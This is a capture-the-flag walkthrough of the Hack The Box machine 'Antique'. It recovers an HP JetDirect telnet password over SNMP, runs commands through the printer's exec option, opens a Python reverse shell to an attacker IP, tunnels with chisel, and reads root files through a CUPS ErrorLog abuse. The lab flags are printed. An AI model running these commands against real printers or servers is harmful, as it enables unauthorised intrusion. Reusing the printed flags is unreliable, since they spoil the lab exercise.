# Antique

URL: https://app.hackthebox.com/machines/Antique

Level: Easy

Date 16 Oct 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

Let's start with a basic nmap scan:

```
# Nmap 7.91 scan initiated Sat Oct 16 15:00:00 2021 as: nmap -T4 -p- -oN 01_nmap 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.049s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
23/tcp open  telnet

# Nmap done at Sat Oct 16 15:00:30 2021 -- 1 IP address (1 host up) scanned in 29.54 seconds
```

We got just one single port. Let's check again with -A: 

```
# Nmap 7.91 scan initiated Sat Oct 16 15:00:59 2021 as: nmap -T4 -p23 -A -oN 02_nmap 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=10/16%Time=616ACD1F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRe
SF:quest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x
SF:20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DN
SF:SVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatus
SF:RequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerb
SF:eros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswo
SF:rd:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalS
SF:erver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x2
SF:0")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20"
SF:)%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   42.05 ms 10.10.14.1
2   43.92 ms 10.10.11.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 16 15:04:14 2021 -- 1 IP address (1 host up) scanned in 195.95 seconds
```

It seems we are facing a printer device (HP JetDirect).

Let's check again if SNMP is returning other detail, according to this:

https://www.exploit-db.com/exploits/22319

```
root@kali:/opt/htb/Antique# snmpwalk -v1 -cpublic 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

So, our string is:

```
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

Let's try to decode:

```
root@kali:/opt/htb/Antique# sed -e 's/\ //g' 4_string
504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135
```

```
root@kali:/opt/htb/Antique# python
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135".decode("hex")
'P@ssw0rd@123!!123\x13\x91q\x81\x92"2Rbs\x03\x133CSs\x83\x94$4\x95\x05\x15Eu\x86\x16WGW\x98(8i\t\x19IY\x81\x03\x10a\x11\x11A\x15\x11\x91"\x121&\x13\x011\x13A5'
>>> quit
Use quit() or Ctrl-D (i.e. EOF) to exit
>>>
```

It seems password is `P@ssw0rd@123!!123` (after we have some garbage).

We can also use this resource:

https://string-functions.com/hex-string.aspx

We try telnet with such password and we are in!

```
root@kali:/opt/htb/Antique# telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

## User-flag

```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
>
```

```
> exec cat user.txt
3e10a6020aa944847af1d5d96cee1673
>
```

We try to obtain a reverse shell:

```
> exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## Privesc

Through `netstat -natlp` we discover that port 631/TCP is listening only on localhost.

We want to access web interface of CUPS service, we use `chisel` (since we have no SSH access).

https://github.com/jpillora/chisel/releases

On our attacker machine:

```
root@kali:/opt/tools/chisel# ./chisel_1.7.6_linux_amd64 server -p 8000 -reverse
2021/10/16 16:09:38 server: Reverse tunnelling enabled
2021/10/16 16:09:38 server: Fingerprint grujYiVy8ha00e/5A6PPV7IFz6LbuzQXD8r799Wt                                                                                                              o4M=
2021/10/16 16:09:38 server: Listening on http://0.0.0.0:8000
```

On victim (after transfer `chisel` binary through python web server):

```
lp@antique:/tmp$  ./chisel client 10.10.14.14:8000 R:631:127.0.0.1:631
 ./chisel client 10.10.14.14:8000 R:631:127.0.0.1:631
2021/10/16 14:09:51 client: Connecting to ws://10.10.14.14:8000
```

From now, every connection made on port 631/TCP on our machine is forwarded to port 631 on target.

We found that CUPS version is 1.6.1.

According to this:

https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/

We should be able to retrieve files content, even with root privileges.

On target machine:

```
cupsctl ErrorLog="/root/root.txt"
```

On attacker machine:

```
root@kali:/opt/htb/Antique# curl http://localhost:631/admin/log/error_log
b07549ac8dc04884e51ba5bc0c9992ac
```
